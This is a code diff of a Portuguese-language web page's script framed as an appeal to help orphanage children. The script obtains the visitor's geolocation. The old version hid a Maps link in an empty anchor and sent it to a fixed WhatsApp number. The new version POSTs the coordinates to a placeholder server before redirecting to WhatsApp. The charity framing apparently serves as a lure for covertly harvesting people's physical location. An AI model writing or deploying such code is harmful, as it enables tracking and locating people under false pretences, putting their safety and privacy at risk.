@@ -219,30 +219,33 @@
   </footer>
 
   <script>
-    function enviarLocalizacao() {
-      if (!navigator.geolocation) {
-        alert("Geolocalização não é suportada neste navegador.");
-        return;
-      }
+function enviarLocalizacao() {
+  if (!navigator.geolocation) {
+    alert("Seu navegador não suporta geolocalização.");
+    return;
+  }
 
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  navigator.geolocation.getCurrentPosition(function(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
 
-        document.getElementById("resultado").innerHTML = `
-          <strong>Obrigado por querer ajudar!</strong><br>
-          <a href="${linkMaps}" target="_blank"></a><br><br>
-          Em breve entraremos em contato para informar como você pode ajudar nossas crianças.
-        `;
-
-        // Envio via WhatsApp
-        const texto = encodeURIComponent(`Olá, quero ajudar as crianças do orfanato: ${linkMaps}`);
-        window.location.href = `https://wa.me/5521998281445?text=${texto}`;
-      }, function(error) {
-        alert("Obrigado");
-      });
-    }
+    // Envia as coordenadas para um servidor (substitua pela sua URL)
+    fetch("https://seu-servidor.com/receber-localizacao", {
+      method: "POST",
+      body: JSON.stringify({ lat: latitude, lng: longitude }),
+      headers: { "Content-Type": "application/json" }
+    })
+    .then(response => {
+      document.getElementById("resultado").innerHTML = "Localização enviada com sucesso! Entraremos em contato.";
+      window.location.href = "https://wa.me/5521998281445?text=Olá,%20quero%20ajudar%20as%20crianças!"; // Mensagem genérica
+    })
+    .catch(error => {
+      alert("Erro ao enviar localização. Tente novamente.");
+    });
+  }, function(error) {
+    alert("Por favor, permita o acesso à localização.");
+  });
+}
   </script>
 </body>
 </html>
